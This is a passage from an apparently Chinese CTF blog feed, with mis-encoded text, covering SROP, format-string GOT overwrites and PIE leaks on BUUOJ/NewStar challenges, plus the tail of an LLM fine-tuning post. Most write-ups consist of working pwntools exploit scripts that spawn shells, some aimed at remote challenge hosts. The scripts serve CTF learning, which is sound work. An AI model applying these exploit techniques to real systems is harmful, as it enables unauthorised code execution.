class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = transformers.Trainer(<br>    model=model,<br>    train_dataset=train_data,<br>    eval_dataset=val_data,<br>    args=transformers.TrainingArguments(<br>        per_device_train_batch_size=micro_batch_size,<br>        gradient_accumulation_steps=gradient_accumulation_steps,<br>        warmup_steps=<span class="hljs-number">100</span>,<br>        num_train_epochs=num_epochs,<br>        learning_rate=learning_rate,<br>        fp16=<span class="hljs-literal">True</span>,<br>        logging_steps=<span class="hljs-number">1</span>,<br>        optim=<span class="hljs-string">&quot;adamw_torch&quot;</span>,<br>        evaluation_strategy=<span class="hljs-string">&quot;steps&quot;</span> <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;no&quot;</span>,<br>        save_strategy=<span class="hljs-string">&quot;steps&quot;</span>,<br>        eval_steps=eval_step <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>        save_steps=save_step,<br>        output_dir=output_dir,<br>        save_total_limit=<span class="hljs-number">20</span>,<br>        load_best_model_at_end=<span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> val_set_size &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span>,<br>        ddp_find_unused_parameters=<span class="hljs-literal">False</span> <span class="hljs-keyword">if</span> ddp <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>        group_by_length=group_by_length,<br>        report_to=<span class="hljs-string">&quot;wandb&quot;</span> <span class="hljs-keyword">if</span> use_wandb <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;tensorboard&quot;</span>,<br>        run_name=wandb_run_name <span class="hljs-keyword">if</span> use_wandb <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>,<br>    ),<br>    data_collator=transformers.DataCollatorForSeq2Seq(<br>        tokenizer, pad_to_multiple_of=<span class="hljs-number">8</span>, return_tensors=<span class="hljs-string">&quot;pt&quot;</span>, padding=<span class="hljs-literal">True</span><br>    ),<br>)<br>model.config.use_cache = <span class="hljs-literal">False</span><br><br>old_state_dict = model.state_dict<br>model.state_dict = (<br>    <span class="hljs-keyword">lambda</span> self, *_, **__: get_peft_model_state_dict(<br>        self, old_state_dict()<br>    )<br>).__get__(model, <span class="hljs-built_in">type</span>(model))<br><br><span class="hljs-comment"># if torch.__version__ &gt;= &quot;2&quot; and sys.platform != &quot;win32&quot;:</span><br><span class="hljs-comment">#     model = torch.compile(model)</span><br><br>trainer.train(resume_from_checkpoint=resume_from_checkpoint)<br>model.save_pretrained(output_dir)<br></code></pre></td></tr></table></figure><h4 id="è®­ç»ƒè¿‡ç¨‹ä¸­çš„é—®é¢˜"><a href="#è®­ç»ƒè¿‡ç¨‹ä¸­çš„é—®é¢˜" class="headerlink" title="è®­ç»ƒè¿‡ç¨‹ä¸­çš„é—®é¢˜"></a>è®­ç»ƒè¿‡ç¨‹ä¸­çš„é—®é¢˜</h4><p>æ‰€æœ‰epochè·‘å®Œä»¥åï¼Œåº”è¯¥æ˜¯åœ¨save_pretrainedé‡ŒæŠ¥é”™</p><p><code>SafetensorError: Error while deserializing header: InvalidHeaderDeserialization</code></p><p><a href="https://github.com/huggingface/transformers/issues/27397">https://github.com/huggingface/transformers/issues/27397</a> é‡Œè¯´ï¼ŒæŠŠ <code>model = torch.compile(model)</code>åˆ æ‰ï¼Œä½†æ˜¯åˆ æ‰ä¹‹ååˆè·‘äº†ä¸€ä¸ªepochï¼Œè¿˜æ˜¯æŠ¥é”™</p>]]></content>
    
    
    <categories>
      
      <category>è®ºæ–‡å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>papers reproduction</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SROP</title>
    <link href="/2023/11/27/ctf-pwn/srop/"/>
    <url>/2023/11/27/ctf-pwn/srop/</url>
    
    <content type="html"><![CDATA[<p>éœ€è¦syscall retï¼Œå¦‚æœæ²¡æœ‰syscall 15ï¼Œå°±è¦å…ˆé€ ä¸€ä¸ª  pop rax, ret åŠ  0xf çš„gadgetï¼Œç„¶ååœ¨æ‰§è¡Œsyscallã€‚</p><h3 id="Newstar2023-srop"><a href="#Newstar2023-srop" class="headerlink" title="Newstar2023 srop"></a>Newstar2023 srop</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><p>æ•´ä½“æ€è·¯å°±æ˜¯å…ˆæ„é€ ä¸€ä¸ªsyscall 15çš„ropï¼Œç„¶ååœ¨è¿™ä¸ªsyscallæ ˆä¸‹é¢æ”¾ä¸Šä¸€ä¸ªframeï¼Œframeçš„ripæŒ‡å‘syscallï¼Œç„¶åå†æŠŠéœ€è¦æ‰§è¡Œçš„å‡½æ•°å’Œå‚æ•°å†™è¿›å…¶ä»–å¯„å­˜å™¨</p><p>0xfæ˜¯sigreturnè°ƒç”¨å·ï¼Œ59æ˜¯execveè°ƒç”¨å·</p><p>ä¸æ‡‚ä¸ºä»€ä¹ˆsyscallçš„è°ƒç”¨å·æ˜¯åœ¨rdiä¸Š</p><blockquote><p>ç­”ï¼šè¿™é“é¢˜æ˜¯call syscall ï¼Œä¸æ˜¯ç›´æ¥æ‰§è¡Œsyscall</p><p>__int64 syscall(__int64 sysno, â€¦)<br>{<br>      return syscall(sysno);<br>}</p></blockquote><p>ç¬¬ä¸€æ¬¡sendæ ˆè¿ç§»æ˜¯ä¸ºäº†èƒ½å¤ŸçŸ¥é“/bin/shåœ¨å“ªï¼Œåœ¨åŸæœ¬çš„æ ˆä¸Šä¸çŸ¥é“åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br>p=process(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./pwn_1&#x27;</span>)<br><br>rdi=<span class="hljs-number">0x401203</span><br>syscall=elf.plt[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br>lea=<span class="hljs-number">0x401171</span><br>bss=<span class="hljs-number">0x404050</span>+<span class="hljs-number">0x300</span> <span class="hljs-comment"># è¿™ä¸ª0x300æ¢æˆåˆ«çš„æˆ–è€…ç›´æ¥ä¸åŠ ï¼Œè¯•è¿‡ä¹Ÿå¯ä»¥</span><br><br>p.recvuntil(<span class="hljs-string">&#x27;welcome to srop!\n&#x27;</span>)<br>frame=SigreturnFrame()<br>frame.rdi=<span class="hljs-number">59</span><br>frame.rsi=bss-<span class="hljs-number">0x30</span> <span class="hljs-comment"># åŸæœ¬çš„æ ˆä¸Šrbpè·ç¦»å­—ç¬¦ä¸²å¼€å¤´æ˜¯0x30å­—èŠ‚ï¼Œæ ˆè¿ç§»è¿‡æ¥ä¹Ÿä¸€æ ·</span><br>frame.rdx=<span class="hljs-number">0</span><br>frame.rcx=<span class="hljs-number">0</span><br>frame.rsp=bss+<span class="hljs-number">0x38</span><br>frame.rip=syscall<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(bss,lea))<br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+flat(rdi,<span class="hljs-number">0xf</span>,syscall,frame))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h3><p><a href="https://buuoj.cn/challenges#ciscn_2019_es_7">https://buuoj.cn/challenges#ciscn_2019_es_7</a></p><p>sys_writeæœ¬èº«æ³„éœ²äº†æ ˆä¸Šçš„åœ°å€ï¼Œè®¡ç®—å’Œbufè¾“å…¥çš„binshçš„åç§»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.arch=&#x27;amd64&#x27;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-comment">#p=process(&quot;./ciscn_2019_es_7&quot;)</span><br>p=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25797</span>)<br><br>syscall_ret=<span class="hljs-number">0x400517</span><br>sigreturn_addr=<span class="hljs-number">0x4004da</span> <span class="hljs-comment"># rax = 15, ret</span><br>system_addr=<span class="hljs-number">0x4004E2</span><span class="hljs-comment"># syscall, ret</span><br><br>rax=<span class="hljs-number">0x4004f1</span><br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">9</span>+p64(rax))<br>p.recv(<span class="hljs-number">32</span>)<br>stack_addr=u64(p.recv(<span class="hljs-number">8</span>))<br>log.success(<span class="hljs-string">&quot;stack: &quot;</span>+<span class="hljs-built_in">hex</span>(stack_addr))<br>p.recv(<span class="hljs-number">8</span>)<br><br>sigframe = SigreturnFrame()<br>sigframe.rax = <span class="hljs-number">59</span><br>sigframe.rdi = stack_addr - <span class="hljs-number">0x118</span>  <br>sigframe.rsi = <span class="hljs-number">0x0</span><br>sigframe.rdx = <span class="hljs-number">0x0</span><br>sigframe.rsp = stack_addr<br>sigframe.rip = syscall_ret<br><br>p.send(<span class="hljs-string">b&quot;/bin/sh&quot;</span>+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x1</span>+<span class="hljs-number">0x8</span>)+p64(sigreturn_addr)+p64(syscall_ret)+<span class="hljs-built_in">bytes</span>(sigframe))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„expé‡Œbinshå’Œæ³„éœ²çš„åœ°å€åç§»æ˜¯0x118ï¼Œä½†æ˜¯åœ¨æˆ‘æœ¬åœ°æ˜¯328ï¼ˆkali2023.3ï¼‰ï¼Œè¿œç¨‹æ˜¯ubuntu18</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/100x <span class="hljs-number">0x7fffffffde00</span> -<span class="hljs-number">40</span><br><span class="hljs-number">0x7fffffffddd8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x7fffffffdde8</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x31333231</span>      <span class="hljs-number">0x32313332</span> <span class="hljs-comment">#  ddf0æ˜¯bufçš„åœ°å€</span><br><span class="hljs-number">0x7fffffffddf8</span>: <span class="hljs-number">0x00000a33</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffde20</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde08</span>: <span class="hljs-number">0x00400536</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xffffdf38</span>      <span class="hljs-number">0x00007fff</span><br><span class="hljs-number">0x7fffffffde18</span>: <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000001</span>      <span class="hljs-number">0x00000000</span><br>pwndbg&gt; stack <span class="hljs-number">30</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚ rbp rsp <span class="hljs-number">0x7fffffffde00</span> â€”â–¸ <span class="hljs-number">0x7fffffffde20</span> â—‚â€” <span class="hljs-number">0x1</span><br>01:0008â”‚         <span class="hljs-number">0x7fffffffde08</span> â€”â–¸ <span class="hljs-number">0x400536</span> (main+<span class="hljs-number">25</span>) â—‚â€” nop  <span class="hljs-comment"># ret addr</span><br>02:<span class="hljs-number">00</span>10â”‚         <span class="hljs-number">0x7fffffffde10</span> â€”â–¸ <span class="hljs-number">0x7fffffffdf38</span> â€”â–¸ <span class="hljs-number">0x7fffffffe2af</span> â—‚â€” <span class="hljs-string">&#x27;/home/kali/Desktop/ciscn_s_3&#x27;</span><br>03:0018â”‚         <span class="hljs-number">0x7fffffffde18</span> â—‚â€” <span class="hljs-number">0x100000000</span><br>04:0020â”‚         <span class="hljs-number">0x7fffffffde20</span> â—‚â€” <span class="hljs-number">0x1</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¿®æ”¹gotè¡¨</title>
    <link href="/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/11/27/ctf-pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E9%9C%B2gots%E8%A1%A8%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStar2023-puts-or-system"><a href="#NewStar2023-puts-or-system" class="headerlink" title="NewStar2023 puts or system"></a>NewStar2023 puts or system</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><p>é€šè¿‡%sæ³„éœ²libc</p><p>ç›®çš„æ˜¯é€šè¿‡<code>b&#39;a&#39; * 4 + b&#39;%?$s&#39; + p64(puts_got)</code>æŠŠputs_gotå½“æˆå­—ç¬¦ä¸²çš„åœ°å€ï¼Œæ‰“å°gotè¡¨é¡¹</p><p>4ä¸ªaå’Œ<code>%?$s</code>åŠ èµ·æ¥æ­£å¥½æ˜¯8ä¸ªå­—èŠ‚ã€‚</p><p>åœ¨è·å–æ˜¯ç¬¬å‡ ä¸ª%sçš„æ—¶å€™ï¼Œç”±äºä¸èƒ½åƒ%pé‚£æ ·ä¸€ç›´%s%s%s%sâ€¦..ï¼Œå› ä¸º%så¦‚æœä½œä¸ºåœ°å€å–å†…å®¹å¤±è´¥ä¼šå´©æºƒ</p><p>æ‰€ä»¥åœ¨ç¬¬ä¸€æ¬¡è¯•çš„æ—¶å€™å°±è¦ç”¨ <code>&#39;a&#39; * 8 + &#39;b&#39; * 8</code> ï¼ˆ8ä¸ªaä»£è¡¨åŸæœ¬çš„4ä¸ªaå’Œ%?$sï¼Œ8ä¸ªbä»£è¡¨putsçš„gotè¡¨åœ°å€ï¼‰ï¼Œç„¶åå†åŠ ä¸Š%p%p%p%p%p%p%p%pâ€¦â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./putsorsys&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27515</span>)<br>elf = ELF(<span class="hljs-string">&#x27;putsorsys&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br><br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>offset = <span class="hljs-number">8</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span> + <span class="hljs-string">b&#x27;%9$s&#x27;</span> + p64(puts_got)<br>p.send(payload)<br><br>p.recvuntil(<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>puts_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>] <br>sys_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] <br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys_addr))<br><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload = fmtstr_payload(offset, &#123;puts_got:sys_addr&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendline(<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>fmt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PIE Format String</title>
    <link href="/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <url>/2023/11/26/ctf-pwn/PIE%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="NewStar2023-Secret-Number"><a href="#NewStar2023-Secret-Number" class="headerlink" title="NewStar2023 Secret Number"></a>NewStar2023 Secret Number</h3><p><a href="https://buuoj.cn/match/matches/190/challenges">https://buuoj.cn/match/matches/190/challenges</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-38h] BYREF</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+Ch] [rbp-34h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  v3 = time(<span class="hljs-number">0LL</span>);<br>  srand(v3);<br>  secret = rand();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to NewStar CTF!!&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Give me some gift?(0/1)&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);<br>    <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What&#x27;s it&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">32uLL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oh thanks,There is my gift:&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(buf);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Guess the number&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( v5 == secret )<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;You are wrong!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ³„éœ²PIEåç§»"><a href="#æ³„éœ²PIEåç§»" class="headerlink" title="æ³„éœ²PIEåç§»"></a>æ³„éœ²PIEåç§»</h4><p>æ³„éœ²æ ˆé‡Œçš„mainå‡½æ•°çš„åœ°å€ï¼Œä½†æ˜¯è¾“å…¥æœ€å¤š32å­—èŠ‚ï¼Œé %p%p%p%pâ€¦.æ˜¯è¾¾ä¸åˆ°ç¬¬åä¸ƒä¸ª%pçš„ã€‚</p><p>ä¸çŸ¥é“æœ‰ä»€ä¹ˆåˆ«çš„æ–¹æ³•ï¼Œåªèƒ½ä¸€ä¸ªä¸€ä¸ªè¯•</p><p>pwntoolsçš„<code>fmtstr_payload</code>å¯ä»¥ç›´æ¥æŒ‡å®šä¿®æ”¹ä»»æ„åœ°å€çš„å€¼ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯<code>aaaaaaaa</code>çš„åç§»ï¼Œåé¢çš„å­—å…¸æ˜¯è¦ä¿®æ”¹çš„åœ°å€å’Œå€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26261)</span><br>p = process(<span class="hljs-string">&#x27;./secretnumber&#x27;</span>)<br><br>offset=<span class="hljs-number">8</span> <span class="hljs-comment"># aaaaaaaa</span><br>num_addr = <span class="hljs-number">0x404c</span><br><br><span class="hljs-comment">##leak pie</span><br>p.sendlineafter(<span class="hljs-string">b&quot;(0/1)\n&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;aaaaaaaa%17$p&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;What&#x27;s it\n&quot;</span>,payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>main_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;f5&#x27;</span>)[-<span class="hljs-number">12</span>:],<span class="hljs-number">16</span>)<br>pie=main_addr-<span class="hljs-number">0x12F5</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))<br>num_addr += pie<br><br><span class="hljs-comment">##fmtpayload</span><br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>fmtpayload=fmtstr_payload(offset, &#123;num_addr:<span class="hljs-number">1</span>&#125;)<br>p.sendlineafter(<span class="hljs-string">&quot;What&#x27;s it\n&quot;</span>,fmtpayload)<br>p.sendlineafter(<span class="hljs-string">&quot;(0/1)\n&quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Guess the number\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure><h4 id="ç”¨ç›¸åŒçš„ç§å­çŒœæµ‹ä¼ªéšæœºæ•°"><a href="#ç”¨ç›¸åŒçš„ç§å­çŒœæµ‹ä¼ªéšæœºæ•°" class="headerlink" title="ç”¨ç›¸åŒçš„ç§å­çŒœæµ‹ä¼ªéšæœºæ•°"></a>ç”¨ç›¸åŒçš„ç§å­çŒœæµ‹ä¼ªéšæœºæ•°</h4><p>ä¸ä¸€å®šæ¯æ¬¡æˆåŠŸï¼Œè¦å¤šè¯•å‡ æ¬¡ï¼Œè®©seedå¯¹ä¸Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26261</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./secretnumber&#x27;</span>)<br>libc=cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br> <br>seed=libc.time(<span 